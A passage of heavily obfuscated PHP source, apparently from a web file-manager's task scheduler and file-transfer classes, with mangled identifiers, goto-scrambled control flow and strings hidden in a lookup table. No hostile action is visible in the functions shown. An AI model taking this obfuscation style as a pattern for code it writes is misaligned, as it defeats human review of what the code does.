($e™ªÀëêã[$aÇ—Şé[29]] == $aÇ—Şé[85]) { $e™ªÀëêã[$aÇ—Şé[84]] = $e†ö—“ñÆº->getPathInner($e™ªÀëêã[$aÇ—Şé[84]]); $this->_copyChildTo($e†ö—“ñÆº, $e™ªÀëêã[$aÇ—Şé[84]], $EÙ¸³Ì”Øµ, $dÊÂ¾ŞŸõ‡, $e®Šêî¿ÌØ, $f”Øˆ¡ŒÅÜ); } } goto FÃ©ÂöÄÍ; FÃ©ÂöÄÍ: } private function _addFiles($a–á…‰–’, $eó“œêåÂ¹, $BãÃ¶˜ˆ»Š) { goto CÒİÁÌ–æ±; CÒİÁÌ–æ±: $FòÃÓÎ‘”ì =& $_SERVER[°Óó£ÌİóèÅ]; if (!$eó“œêåÂ¹ || count($eó“œêåÂ¹) == 0) { return array(); } $EËŸÕõÁ”Ü = array(); goto A„ÖñáÇç”; A„ÖñáÇç”: foreach ($eó“œêåÂ¹ as &$cøŒ®ĞóîŞ) { goto CÏİ·Ìç³; BÔ´‹ëÊø‚: $cøŒ®ĞóîŞ[$FòÃÓÎ‘”ì[168]] = $B…Çˆ•—³›; Hook::trigger($FòÃÓÎ‘”ì[434], $cøŒ®ĞóîŞ); $EËŸÕõÁ”Ü[$B…Çˆ•—³›][] =& $cøŒ®ĞóîŞ; goto CÆ–áÓË¿Ç; CÆ–áÓË¿Ç: if (count($EËŸÕõÁ”Ü[$B…Çˆ•—³›]) > 1) { $cøŒ®ĞóîŞ[$FòÃÓÎ‘”ì[432]] = !0; } goto BÆ¹–Á–é; CÏİ·Ìç³: Hook::trigger($FòÃÓÎ‘”ì[433], $cøŒ®ĞóîŞ); $cøŒ®ĞóîŞ[$FòÃÓÎ‘”ì[84]] = $a–á…‰–’->getPathInner($cøŒ®ĞóîŞ[$FòÃÓÎ‘”ì[84]]); $CŒ‘Š–®È = $a–á…‰–’->hashSimple($cøŒ®ĞóîŞ[$FòÃÓÎ‘”ì[84]]); goto Fˆ…Ëİ³Ë; Fˆ…Ëİ³Ë: $B…Çˆ•—³› = $a–á…‰–’->hashMd5($cøŒ®ĞóîŞ[$FòÃÓÎ‘”ì[84]]); if (strlen($B…Çˆ•—³›) > 10 && !isset($EËŸÕõÁ”Ü[$B…Çˆ•—³›])) { $EËŸÕõÁ”Ü[$B…Çˆ•—³›] = array(); } $cøŒ®ĞóîŞ[$FòÃÓÎ‘”ì[169]] = $CŒ‘Š–®È; goto BÔ´‹ëÊø‚; BÆ¹–Á–é: } $C‚Á÷œ­Éê = array($FòÃÓÎ‘”ì[168] => array($FòÃÓÎ‘”ì[7], array_keys($EËŸÕõÁ”Ü))); $Dğ©„äÙèÒ = Model($FòÃÓÎ‘”ì[435]); goto f‹¹³…ğƒ£; cˆ¼èù‘•æ: return $dƒ¬¬×´È; goto bÛ•¸çšø¡; bî‰¨‚°´·: foreach ($eòêç“´ÂÌ as $A†‘å‹‘¿) { if (!isset($EËŸÕõÁ”Ü[$A†‘å‹‘¿[$FòÃÓÎ‘”ì[168]]])) { continue; } $E§éâÛèßê =& $EËŸÕõÁ”Ü[$A†‘å‹‘¿[$FòÃÓÎ‘”ì[168]]]; foreach ($E§éâÛèßê as &$cøŒ®ĞóîŞ) { $cøŒ®ĞóîŞ[$FòÃÓÎ‘”ì[390]] = $A†‘å‹‘¿[$FòÃÓÎ‘”ì[390]]; } unset($cøŒ®ĞóîŞ); } $dƒ¬¬×´È = array(); foreach ($eó“œêåÂ¹ as $b—ø¤éÀœ) { $dƒ¬¬×´È[$b—ø¤éÀœ[$FòÃÓÎ‘”ì[28]]] = $b—ø¤éÀœ; } goto cˆ¼èù‘•æ; Cîó¨ÎëÏÅ: $C‚Á÷œ­Éê = array($FòÃÓÎ‘”ì[168] => array($FòÃÓÎ‘”ì[7], array_keys($EËŸÕõÁ”Ü))); $eòêç“´ÂÌ = $Dğ©„äÙèÒ->where($C‚Á÷œ­Éê)->select(); $eòêç“´ÂÌ = $eòêç“´ÂÌ ? $eòêç“´ÂÌ : array(); goto bî‰¨‚°´·; f‹¹³…ğƒ£: $eòêç“´ÂÌ = $Dğ©„äÙèÒ->where($C‚Á÷œ­Éê)->select(); $eòêç“´ÂÌ = $eòêç“´ÂÌ ? $eòêç“´ÂÌ : array(); foreach ($eòêç“´ÂÌ as $A†‘å‹‘¿) { if (!isset($EËŸÕõÁ”Ü[$A†‘å‹‘¿[$FòÃÓÎ‘”ì[168]]])) { continue; } $DºÓŸ à¹ = $EËŸÕõÁ”Ü[$A†‘å‹‘¿[$FòÃÓÎ‘”ì[168]]]; foreach ($DºÓŸ à¹ as &$cøŒ®ĞóîŞ) { $cøŒ®ĞóîŞ[$FòÃÓÎ‘”ì[390]] = $A†‘å‹‘¿[$FòÃÓÎ‘”ì[390]]; $cøŒ®ĞóîŞ[$FòÃÓÎ‘”ì[432]] = !0; } unset($cøŒ®ĞóîŞ); } goto cĞº™÷ªç¨; cĞº™÷ªç¨: $f†¤Õéê = array(); foreach ($eó“œêåÂ¹ as $bå¦Ä‰Æ‡‡) { if (isset($bå¦Ä‰Æ‡‡[$FòÃÓÎ‘”ì[432]]) && $bå¦Ä‰Æ‡‡[$FòÃÓÎ‘”ì[432]]) { continue; } $aæÆé¬¨è‚ = $a–á…‰–’->getPathInner($bå¦Ä‰Æ‡‡[$FòÃÓÎ‘”ì[84]]); $fÔ•µÍ¦ğê = $Dğ©„äÙèÒ->addFileMake($aæÆé¬¨è‚, $bå¦Ä‰Æ‡‡[$FòÃÓÎ‘”ì[86]], $bå¦Ä‰Æ‡‡[$FòÃÓÎ‘”ì[169]], $bå¦Ä‰Æ‡‡[$FòÃÓÎ‘”ì[168]], $bå¦Ä‰Æ‡‡[$FòÃÓÎ‘”ì[28]], $BãÃ¶˜ˆ»Š); $f†¤Õéê[] = $fÔ•µÍ¦ğê; } $Dğ©„äÙèÒ->addAll($f†¤Õéê); goto Cîó¨ÎëÏÅ; bÛ•¸çšø¡: } } goto B‹ËˆÇäø; E„‚©ì²£¦: class AutoTask { public static function start() { goto eº‹À»±µÀ; cØÁÔñŸ…: while (!0) { self::cacheClear(); if (self::valueGet($Fì‡ÏªÈ§É[454]) != $Fì‡ÏªÈ§É[384]) { self::valueSet($Fì‡ÏªÈ§É[1060], $Fì‡ÏªÈ§É[410]); self::log($Fì‡ÏªÈ§É[1064]); die; } self::valueSet($Fì‡ÏªÈ§É[1060], $Fì‡ÏªÈ§É[384]); self::valueSet($Fì‡ÏªÈ§É[1061], time()); self::taskRunAll(); sleep(self::valueGet($Fì‡ÏªÈ§É[1065])); } goto d¥Ÿ»ƒÉ‘É; BÄ©‰ƒ½²¹: http_close(); self::valueSet($Fì‡ÏªÈ§É[1060], $Fì‡ÏªÈ§É[384]); Hook::bind($Fì‡ÏªÈ§É[1062], $Fì‡ÏªÈ§É[1063]); goto cØÁÔñŸ…; eº‹À»±µÀ: $Fì‡ÏªÈ§É =& $_SERVER[°Óó£ÌİóèÅ]; if (self::valueGet($Fì‡ÏªÈ§É[454]) != $Fì‡ÏªÈ§É[384]) { return; } if (self::valueGet($Fì‡ÏªÈ§É[1060]) == $Fì‡ÏªÈ§É[384]) { $Aô‹ì¤Ü© = self::valueGet($Fì‡ÏªÈ§É[1061]); if (time() - $Aô‹ì¤Ü© > 3600 * 2) { self::restart(); } return; } goto BÄ©‰ƒ½²¹; d¥Ÿ»ƒÉ‘É: } public static function restart() { $BÑéÙ­×›¼ =& $_SERVER[°Óó£ÌİóèÅ]; http_close(); self::valueSet($BÑéÙ­×›¼[454], $BÑéÙ­×›¼[410]); sleep(self::valueGet($BÑéÙ­×›¼[1065]) + 5); self::valueSet($BÑéÙ­×›¼[1060], $BÑéÙ­×›¼[410]); self::valueSet($BÑéÙ­×›¼[454], $BÑéÙ­×›¼[384]); } public static function shutdownEvent() { $aíˆ¹‚¤¿Œ =& $_SERVER[°Óó£ÌİóèÅ]; self::valueSet($aíˆ¹‚¤¿Œ[1060], $aíˆ¹‚¤¿Œ[410]); self::log($aíˆ¹‚¤¿Œ[1066]); } public static function config($Fø…èŠÙî, $e­²ÎòóÏ) { $Eäù›ÑÄ» =& $_SERVER[°Óó£ÌİóèÅ]; $EŞ‡ÈÀÚ† = 20; $e­²ÎòóÏ = intval($e­²ÎòóÏ) <= $EŞ‡ÈÀÚ† ? $EŞ‡ÈÀÚ† : intval($e­²ÎòóÏ); self::valueSet($Eäù›ÑÄ»[454], $Fø…èŠÙî); self::valueSet($Eäù›ÑÄ»[1065], $e­²ÎòóÏ); } private static function taskRunAll() { $e‹£ÓùÆ½Í =& $_SERVER[°Óó£ÌİóèÅ]; $E·Èà·¦« = Model($e‹£ÓùÆ½Í[1067])->listData(); $F½ÑŞÀ£ß² = count($E·Èà·¦«); for ($A«…­¾–‘÷ = 0; $A«…­¾–‘÷ < $F½ÑŞÀ£ß²; $A«…­¾–‘÷++) { $BˆôšøÕö¥ = $E·Èà·¦«[$A«…­¾–‘÷]; if ($BˆôšøÕö¥[$e‹£ÓùÆ½Í[1068]] != $e‹£ÓùÆ½Í[384]) { continue; } if (!self::taskTimeCheck($BˆôšøÕö¥)) { continue; } self::taskRun($BˆôšøÕö¥); } } private static function taskTimeCheck($f¶¯Ñ‚ç) { goto Aøí…óçÙâ; D¯Š¿©ÌŞé: $E¥í­™ ‚ = strtotime($F¥ùã‡ïå±[1069] . $D¥°›ã ©–[$F¥ùã‡ïå±[1070]] . $F¥ùã‡ïå±[1071]) - strtotime($F¥ùã‡ïå±[1072]); $Eİ¼ÀÚŞ†Õ = time() - strtotime(date($F¥ùã‡ïå±[1073]) . $F¥ùã‡ïå±[1074]); $f«›öæ’Æ– = $Eİ¼ÀÚŞ†Õ >= $E¥í­™ ‚ && $Eİ¼ÀÚŞ†Õ <= $E¥í­™ ‚ + 3600; goto fÌ°‚âµÕó; Aøí…óçÙâ: $F¥ùã‡ïå± =& $_SERVER[°Óó£ÌİóèÅ]; $D¥°›ã ©– = json_decode($f¶¯Ñ‚ç[$F¥ùã‡ïå±[198]], !0); $CññíÅ›ó½ = intval($f¶¯Ñ‚ç[$F¥ùã‡ïå±[1061]]); goto D¯Š¿©ÌŞé; fÌ°‚âµÕó: switch ($D¥°›ã ©–[$F¥ùã‡ïå±[29]]) { case $F¥ùã‡ïå±[1075]: if (time() - $CññíÅ›ó½ < 3600 * 24 * 30) { return !1; } if ($D¥°›ã ©–[$F¥ùã‡ïå±[1075]] == date($F¥ùã‡ïå±[1076]) && $f«›öæ’Æ–) { return !0; } break; case $F¥ùã‡ïå±[1077]: if (time() - $CññíÅ›ó½ < 3600 * 24 * 7) { return !1; } $Dù‘ÙÕõ‹Ù = date($F¥ùã‡ïå±[1078]) == 0 ? 7 : date($F¥ùã‡ïå±[1078]); if ($D¥°›ã ©–[$F¥ùã‡ïå±[1077]] == $Dù‘ÙÕõ‹Ù && $f«›öæ’Æ–) { return !0; } break; case $F¥ùã‡ïå±[1070]: if (time() - $CññíÅ›ó½ < 3600 * 24) { return !1; } if ($f«›öæ’Æ–) { return !0; } break; case $F¥ùã‡ïå±[1079]: if (time() - $CññíÅ›ó½ >= floatval($D¥°›ã ©–[$F¥ùã‡ïå±[1079]]) * 60) { return !0; } break; default: break; } return !1; goto Fº¼¿¸Ë”ó; Fº¼¿¸Ë”ó: } public static function taskRun($EĞÑã‘öº) { goto DØ¬¥”©å; déìòÄ‚˜: $bÏóŞĞÄ¾À = timeFloat(); $bè©®ƒõ›˜ = $dÌ³ø×[33]; switch ($EĞÑã‘öº[$dÌ³ø×[29]]) { case $dÌ³ø×[306]: $f•ãùË  = url_request($EĞÑã‘öº[$dÌ³ø×[1083]], $dÌ³ø×[231], !1, !1, !1, !1, 5); $bè©®ƒõ›˜ = strlen($f•ãùË ); break; case $dÌ³ø×[230]: $bè©®ƒõ›˜ = Hook::apply($EĞÑã‘öº[$dÌ³ø×[1083]]); default: break; } goto bø»æÖ; bø»æÖ: Model($dÌ³ø×[1084])->add(array($dÌ³ø×[1085] => $dÌ³ø×[33], $dÌ³ø×[1086] => $dÌ³ø×[410], $dÌ³ø×[29] => $dÌ³ø×[1087] . $EĞÑã‘öº[$dÌ³ø×[376]], $dÌ³ø×[1088] => json_encode(array($dÌ³ø×[28] => $EĞÑã‘öº[$dÌ³ø×[28]], $dÌ³ø×[1089] => timeFloat() - $bÏóŞĞÄ¾À, $dÌ³ø×[292] => $bè©®ƒõ›˜)))); self::log($dÌ³ø×[1090] . $EĞÑã‘öº[$dÌ³ø×[376]] . $dÌ³ø×[1091] . $bè©®ƒõ›˜); return !0; goto b±¹Ûƒâø; DØ¬¥”©å: $dÌ³ø× =& $_SERVER[°Óó£ÌİóèÅ]; self::log($dÌ³ø×[1080] . $EĞÑã‘öº[$dÌ³ø×[376]] . $dÌ³ø×[1081] . $EĞÑã‘öº[$dÌ³ø×[28]] . $dÌ³ø×[1082] . $EĞÑã‘öº[$dÌ³ø×[1083]]); Model($dÌ³ø×[1067])->run($EĞÑã‘öº[$dÌ³ø×[376]]); goto déìòÄ‚˜; b±¹Ûƒâø: } private static function valueGet($A«Ù­ª¥ÂÍ) { $bª³›Œ‰Ğ =& $_SERVER[°Óó£ÌİóèÅ]; $b¾ÖÚÀæå‘ = $bª³›Œ‰Ğ[1092]; $E×Öù‹åË = Model($bª³›Œ‰Ğ[1093])->get($A«Ù­ª¥ÂÍ, $b¾ÖÚÀæå‘); if (is_null($E×Öù‹åË)) { Model($bª³›Œ‰Ğ[1093])->set($bª³›Œ‰Ğ[1065], 10, $b¾ÖÚÀæå‘); Model($bª³›Œ‰Ğ[1093])->set($bª³›Œ‰Ğ[454], $bª³›Œ‰Ğ[384], $b¾ÖÚÀæå‘); Model($bª³›Œ‰Ğ[1093])->set($bª³›Œ‰Ğ[1060], $bª³›Œ‰Ğ[410], $b¾ÖÚÀæå‘); $E×Öù‹åË = Model($bª³›Œ‰Ğ[1093])->get($A«Ù­ª¥ÂÍ, $b¾ÖÚÀæå‘); } return $E×Öù‹åË; } private static function valueSet($e…µ×µæ«, $fòß®ÕÖ÷ò) { $AÏ­”ÒÜÆœ =& $_SERVER[°Óó£ÌİóèÅ]; return Model($AÏ­”ÒÜÆœ[1093])->set($e…µ×µæ«, $fòß®ÕÖ÷ò, $AÏ­”ÒÜÆœ[1092]); } protected static function log($c®Î¹Ğ”æ¥) { write_log($c®Î¹Ğ”æ¥, $_SERVER[°Óó£ÌİóèÅ][1094]); } private static function cacheClear() { $A‚ íÕÂ° =& $_SERVER[°Óó£ÌİóèÅ]; $Dæ„Ğ³øÆë = Model($A‚ íÕÂ°[1093])->cacheKey($A‚ íÕÂ°[1092]); Cache::clearMemory($Dæ„Ğ³øÆë); } } class Task { const STATYS_STOP = "\163\x74\157\160"; const STATYS_RUNNING = "\x72\165\x6e\x6e\151\x6e\147"; const STATYS_KILL = "\153\x69\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($c Ó‚¦–”ˆ, $cÔôÃÏÃ³ = '', $B—ŠÒ¦ë = 0, $eÌè‰¯æÈ = '') { goto b¾¸òÚé; d£¦ïºß‘ï: $this->task[$fÇŠÁÕˆ…Á[1103]] = timeFloat(); self::valueSet($this->task[$fÇŠÁÕˆ…Á[376]], $this->task); goto aÊŒ˜Û‡â; bË¡šÈÎÌÁ: Hook::bind($fÇŠÁÕˆ…Á[1062], array($this, $fÇŠÁÕˆ…Á[1106])); Hook::bind($fÇŠÁÕˆ…Á[1107], array($this, $fÇŠÁÕˆ…Á[1108])); $this->startAfter(); goto d£¦ïºß‘ï; b¾¸òÚé: $fÇŠÁÕˆ…Á =& $_SERVER[°Óó£ÌİóèÅ]; if (self::get($c Ó‚¦–”ˆ)) { return; } $this->task = array($fÇŠÁÕˆ…Á[376] => $c Ó‚¦–”ˆ, $fÇŠÁÕˆ…Á[1095] => USER_ID, $fÇŠÁÕˆ…Á[1001] => $eÌè‰¯æÈ, $fÇŠÁÕˆ…Á[29] => $cÔôÃÏÃ³, $fÇŠÁÕˆ…Á[1096] => $fÇŠÁÕˆ…Á[33], $fÇŠÁÕˆ…Á[1097] => $B—ŠÒ¦ë, $fÇŠÁÕˆ…Á[1098] => 0, $fÇŠÁÕˆ…Á[1099] => 0, $fÇŠÁÕˆ…Á[1100] => 0, $fÇŠÁÕˆ…Á[1101] => timeFloat(), $fÇŠÁÕˆ…Á[1102] => 0, $fÇŠÁÕˆ…Á[1103] => 0, $fÇŠÁÕˆ…Á[1104] => 0, $fÇŠÁÕˆ…Á[1105] => 0, $fÇŠÁÕˆ…Á[454] => $fÇŠÁÕˆ…Á[1060]); goto bË¡šÈÎÌÁ; aÊŒ˜Û‡â: } public function end() { goto aî¡¯§›äá; d‡­ÄÍ‡ªŞ: Hook::unbind($FõÄìÙ«ïµ[1107], array($this, $FõÄìÙ«ïµ[1108])); $this->endAfter(); $this->task = !1; goto B¿Ô×îö«Ğ; aî¡¯§›äá: $FõÄìÙ«ïµ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$this->task) { return; } if ($this->task[$FõÄìÙ«ïµ[1103]]) { self::valueSet($this->task[$FõÄìÙ«ïµ[376]], !1); } goto f‘œ‡óŞøŸ; f‘œ‡óŞøŸ: $AÓ‚°çËŠá = timeFloat() - $this->task[$FõÄìÙ«ïµ[1101]]; self::log($FõÄìÙ«ïµ[1109] . $this->task[$FõÄìÙ«ïµ[376]] . $FõÄìÙ«ïµ[1110] . $AÓ‚°çËŠá . $FõÄìÙ«ïµ[1111]); Hook::unbind($FõÄìÙ«ïµ[1062], array($this, $FõÄìÙ«ïµ[1106])); goto d‡­ÄÍ‡ªŞ; B¿Ô×îö«Ğ: } public function update($Eõ §´ø¶¹ = 0) { goto a“œİÆ¯¡º; AÒ‚á¶¹õ×: self::cacheClear(); $A‘Ù•º›¦ = self::get($F¬¸ïÑÏ²¿[$AÑğÙ ­ª¡[376]]); $a¦ğİ‡†Á = $A‘Ù•º›¦[$AÑğÙ ­ª¡[454]]; goto dˆÓ¿ƒ¬…´; EÖ‹øƒœÜ“: $F¬¸ïÑÏ²¿[$AÑğÙ ­ª¡[1103]] = timeFloat(); self::valueSet($F¬¸ïÑÏ²¿[$AÑğÙ ­ª¡[376]], $F¬¸ïÑÏ²¿); goto BªøÕ‡…ê; a“œİÆ¯¡º: $AÑğÙ ­ª¡ =& $_SERVER[°Óó£ÌİóèÅ]; $F¬¸ïÑÏ²¿ =& $this->task; if (!$F¬¸ïÑÏ²¿) { return; } goto C†Ş·³®ìï; C†Ş·³®ìï: $F¬¸ïÑÏ²¿[$AÑğÙ ­ª¡[1098]] += $Eõ §´ø¶¹; $F¬¸ïÑÏ²¿[$AÑğÙ ­ª¡[1102]] = timeFloat(); if ($F¬¸ïÑÏ²¿[$AÑğÙ ­ª¡[1097]]) { $F›Œá³ù = timeFloat() - $F¬¸ïÑÏ²¿[$AÑğÙ ­ª¡[1101]] - $F¬¸ïÑÏ²¿[$AÑğÙ ­ª¡[1104]]; $F¬¸ïÑÏ²¿[$AÑğÙ ­ª¡[1099]] = $F¬¸ïÑÏ²¿[$AÑğÙ ­ª¡[1098]] / $F¬¸ïÑÏ²¿[$AÑğÙ ­ª¡[1097]]; $F¬¸ïÑÏ²¿[$AÑğÙ ­ª¡[1100]] = $F¬¸ïÑÏ²¿[$AÑğÙ ­ª¡[1098]] / $F›Œá³ù; if ($F¬¸ïÑÏ²¿[$AÑğÙ ­ª¡[1099]] > 0) { $F¬¸ïÑÏ²¿[$AÑğÙ ­ª¡[1105]] = $F›Œá³ù * (1 - $F¬¸ïÑÏ²¿[$AÑğÙ ­ª¡[1099]]) / $F¬¸ïÑÏ²¿[$AÑğÙ ­ª¡[1099]]; } } goto DêÙÓ×•›î; DêÙÓ×•›î: $this->updateAfter(); $D¼œŞ‡· ö = 0.2; if (timeFloat() - $F¬¸ïÑÏ²¿[$AÑğÙ ­ª¡[1103]] < $D¼œŞ‡· ö) { return; } goto AÒ‚á¶¹õ×; dˆÓ¿ƒ¬…´: if ($a¦ğİ‡†Á == self::STATYS_KILL) { $Dƒ¨ãËÖö = array($AÑğÙ ­ª¡[1112] => LNG($AÑğÙ ­ª¡[1113]), $AÑğÙ ­ª¡[781] => !1); Cache::set($AÑğÙ ­ª¡[1114] . $this->task[$AÑğÙ ­ª¡[376]], $Dƒ¨ãËÖö, 30); $this->end(); die; } else { if ($a¦ğİ‡†Á == self::STATYS_STOP) { $E‚óŠÃ«Ä = 2; $A‘Ù•º›¦[$AÑğÙ ­ª¡[1104]] += $E‚óŠÃ«Ä; self::valueSet($F¬¸ïÑÏ²¿[$AÑğÙ ­ª¡[376]], $A‘Ù•º›¦); sleep($E‚óŠÃ«Ä); $this->update(); return; } } $F¬¸ïÑÏ²¿[$AÑğÙ ­ª¡[454]] = $a¦ğİ‡†Á ? $a¦ğİ‡†Á : $F¬¸ïÑÏ²¿[$AÑğÙ ­ª¡[454]]; $F¬¸ïÑÏ²¿[$AÑğÙ ­ª¡[1104]] = $A‘Ù•º›¦[$AÑğÙ ­ª¡[1104]] ? $A‘Ù•º›¦[$AÑğÙ ­ª¡[1104]] : 0; goto EÖ‹øƒœÜ“; BªøÕ‡…ê: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($fÁ­çñĞŞË) { $BÙàà·‡Æ =& $_SERVER[°Óó£ÌİóèÅ]; Cache::set($BÙàà·‡Æ[1114] . $this->task[$BÙàà·‡Æ[376]], $fÁ­çñĞŞË, 30); return $fÁ­çñĞŞË; } public static function get($eùÃñĞ½‹â) { return self::valueGet($eùÃñĞ½‹â); } public static function listData($EÊïÏ²é¾ó = false) { $Añ²²êëØÈ =& $_SERVER[°Óó£ÌİóèÅ]; $eˆƒÑö™å— = self::valueGet(); if ($EÊïÏ²é¾ó) { $eˆƒÑö™å— = array_filter_by_field($eˆƒÑö™å—, $Añ²²êëØÈ[1095], $EÊïÏ²é¾ó); } $eˆƒÑö™å— = array_sort_by($eˆƒÑö™å—, $Añ²²êëØÈ[1101], !0); return $eˆƒÑö™å—; } public static function kill($a†°òÙªœõ) { return self::changeStatus($a†°òÙªœõ, self::STATYS_KILL); } public static function stop($A¶—Æ×®‚©) { return self::changeStatus($A¶—Æ×®‚©, self::STATYS_STOP); } public static function restart($AàÜ¸Õ£•š) { return self::changeStatus($AàÜ¸Õ£•š, self::STATYS_RUNNING); } public static function killAll() { $D±‘¤ÉÇïõ =& $_SERVER[°Óó£ÌİóèÅ]; $bÏç¯ğ÷äÀ = self::listData(); foreach ($bÏç¯ğ÷äÀ as $d¿­í²ùåê) { self::kill($d¿­í²ùåê[$D±‘¤ÉÇïõ[376]]); } sleep(2); foreach ($bÏç¯ğ÷äÀ as $d¿­í²ùåê) { self::valueSet($d¿­í²ùåê[$D±‘¤ÉÇïõ[376]], !1); } } private static function changeStatus($Bº¢«¦Ü§ƒ, $c—§Œ¨œøœ) { goto c…Šñƒ‘É›; D´ì“¬ùŠ²: $Bóğ³Ó…°ª[$e»Ü»çŒ½[454]] = $c—§Œ¨œøœ; self::valueSet($Bº¢«¦Ü§ƒ, $Bóğ³Ó…°ª); self::log($e»Ü»çŒ½[1115] . $Bóğ³Ó…°ª[$e»Ü»çŒ½[376]] . $e»Ü»çŒ½[1116] . $c—§Œ¨œøœ); goto aÒ¶öÀˆÍÓ; aÒ¶öÀˆÍÓ: return !0; goto aµ»­¤’×; c…Šñƒ‘É›: $e»Ü»çŒ½ =& $_SERVER[°Óó£ÌİóèÅ]; $Bóğ³Ó…°ª = self::valueGet($Bº¢«¦Ü§ƒ); if (!$Bóğ³Ó…°ª) { return !1; } goto D´ì“¬ùŠ²; aµ»­¤’×: } public static function valueGet($e­Ëù¾ƒå = false) { $A¨í°´‰²¶ =& $_SERVER[°Óó£ÌİóèÅ]; $E§ãî›‹Œ§ = $A¨í°´‰²¶[1117]; $A“”¼²ºğİ = Model($A¨í°´‰²¶[1093])->get($e­Ëù¾ƒå, $E§ãî›‹Œ§); if ($e­Ëù¾ƒå) { $A“”¼²ºğİ = $A“”¼²ºğİ ? json_decode($A“”¼²ºğİ, !0) : !1; } else { $A“”¼²ºğİ = $A“”¼²ºğİ ? $A“”¼²ºğİ : array(); foreach ($A“”¼²ºğİ as $dˆ®ìõ–­ => $B÷° öâ¸) { $A“”¼²ºğİ[$dˆ®ìõ–­] = json_decode($B÷° öâ¸, !0); } } return $A“”¼²ºğİ; } public static function valueSet($DË÷Îó¯Ã—, $A‰õ‡È‘ŒÖ) { goto eñßöÏÂ¥º; eŠ˜Û™»ª: return Model($bÌ µ„÷½[1093])->set($DË÷Îó¯Ã—, $a—öŠÏ™ä³, $AƒŠ‚¹‘Ì); goto cİåó¢çµ¯; eñßöÏÂ¥º: $bÌ µ„÷½ =& $_SERVER[°Óó£ÌİóèÅ]; $AƒŠ‚¹‘Ì = $bÌ µ„÷½[1117]; if (!$A‰õ‡È‘ŒÖ) { return Model($bÌ µ„÷½[1093])->remove($DË÷Îó¯Ã—, $AƒŠ‚¹‘Ì); } goto e–ˆµÙÏîì; e–ˆµÙÏîì: $a—öŠÏ™ä³ = json_encode($A‰õ‡È‘ŒÖ); if (!$a—öŠÏ™ä³) { ob_start(); var_dump($A‰õ‡È‘ŒÖ); $CÀ˜®µíÂ° = ob_get_clean(); self::log($bÌ µ„÷½[1118] . json_encode_force($CÀ˜®µíÂ°)); } if (!$DË÷Îó¯Ã— || !$A‰õ‡È‘ŒÖ[$bÌ µ„÷½[376]]) { return !1; } goto eŠ˜Û™»ª; cİåó¢çµ¯: } public static function cacheClear() { $bæÒËŸÊ Ê =& $_SERVER[°Óó£ÌİóèÅ]; $Bªò›²‘ÀÉ = Model($bæÒËŸÊ Ê[1093])->cacheKey($bæÒËŸÊ Ê[1117]); Cache::clearMemory($Bªò›²‘ÀÉ); } public static function log($e ã°ùéì—) { write_log($e ã°ùéì—, $_SERVER[°Óó£ÌİóèÅ][1119]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto b¿´†•é ; b•¶´Œ±Ò”: $FåÕˆÇ´Ãö[$Aæµ¡òÅ­[1096]] = $Aæµ¡òÅ­[33]; $FåÕˆÇ´Ãö[$Aæµ¡òÅ­[1137]] = $Aæµ¡òÅ­[33]; $FåÕˆÇ´Ãö[$Aæµ¡òÅ­[1138]] = 0; goto eÃßë´†½; aØ£ªíÒËõ: Hook::bind($Aæµ¡òÅ­[431], array($this, $Aæµ¡òÅ­[1125])); Hook::bind($Aæµ¡òÅ­[433], array($this, $Aæµ¡òÅ­[1126])); Hook::bind($Aæµ¡òÅ­[434], array($this, $Aæµ¡òÅ­[1126])); goto aÂ˜äñÁ®é; b¤Øí°“Ë°: Hook::bind($Aæµ¡òÅ­[1120], array($this, $Aæµ¡òÅ­[1121])); Hook::bind($Aæµ¡òÅ­[1122], array($this, $Aæµ¡òÅ­[1123])); Hook::bind($Aæµ¡òÅ­[430], array($this, $Aæµ¡òÅ­[1124])); goto aØ£ªíÒËõ; eÃßë´†½: if (!$FåÕˆÇ´Ãö[$Aæµ¡òÅ­[1001]]) { $FåÕˆÇ´Ãö[$Aæµ¡òÅ­[1001]] = LNG($Aæµ¡òÅ­[1139]); } goto DÁÜæÓÓ Œ; D÷ù’ªİÄÁ: $FåÕˆÇ´Ãö[$Aæµ¡òÅ­[1133]] = LNG($Aæµ¡òÅ­[1134]); $FåÕˆÇ´Ãö[$Aæµ¡òÅ­[1135]] = 0; $FåÕˆÇ´Ãö[$Aæµ¡òÅ­[1136]] = 0; goto b•¶´Œ±Ò”; b¿´†•é : $Aæµ¡òÅ­ =& $_SERVER[°Óó£ÌİóèÅ]; $FåÕˆÇ´Ãö =& $this->task; $this->sourceCopyFolder = !1; goto b¤Øí°“Ë°; aÂ˜äñÁ®é: Hook::bind($Aæµ¡òÅ­[1127], array($this, $Aæµ¡òÅ­[1128])); Hook::bind($Aæµ¡òÅ­[1129], array($this, $Aæµ¡òÅ­[1130])); Hook::bind($Aæµ¡òÅ­[1131], array($this, $Aæµ¡òÅ­[1132])); goto D÷ù’ªİÄÁ; DÁÜæÓÓ Œ: } protected function endAfter() { $Dò”„†Òƒò =& $_SERVER[°Óó£ÌİóèÅ]; Hook::unbind($Dò”„†Òƒò[1120], array($this, $Dò”„†Òƒò[1121])); Hook::unbind($Dò”„†Òƒò[1122], array($this, $Dò”„†Òƒò[1123])); Hook::unbind($Dò”„†Òƒò[1127], array($this, $Dò”„†Òƒò[1128])); Hook::unbind($Dò”„†Òƒò[1129], array($this, $Dò”„†Òƒò[1130])); Hook::unbind($Dò”„†Òƒò[1131], array($this, $Dò”„†Òƒò[1132])); } public function updateAfter() { goto EÇÜÚùÙ­ƒ; A©Îõ¢ù: $a¾èì¨÷Í = 0; if ($Eì±”µŒåö[$a¯ÒÜè¬ßí[1137]] == $a¯ÒÜè¬ßí[789]) { $a¾èì¨÷Í = $Eì±”µŒåö[$a¯ÒÜè¬ßí[1136]] * 0.5; } else { if ($Eì±”µŒåö[$a¯ÒÜè¬ßí[1137]] == $a¯ÒÜè¬ßí[98]) { $a¾èì¨÷Í = $Eì±”µŒåö[$a¯ÒÜè¬ßí[1136]] * 0.5 + $Eì±”µŒåö[$a¯ÒÜè¬ßí[1135]] * 0.5; } } $Eì±”µŒåö[$a¯ÒÜè¬ßí[1099]] = ($Eì±”µŒåö[$a¯ÒÜè¬ßí[1140]] + $a¾èì¨÷Í) / $Eì±”µŒåö[$a¯ÒÜè¬ßí[463]]; goto A‚‘­£æä; A‚‘­£æä: if ($Eì±”µŒåö[$a¯ÒÜè¬ßí[1099]] > 0) { $b‚«÷œŸÀ = timeFloat() - $Eì±”µŒåö[$a¯ÒÜè¬ßí[1101]] - 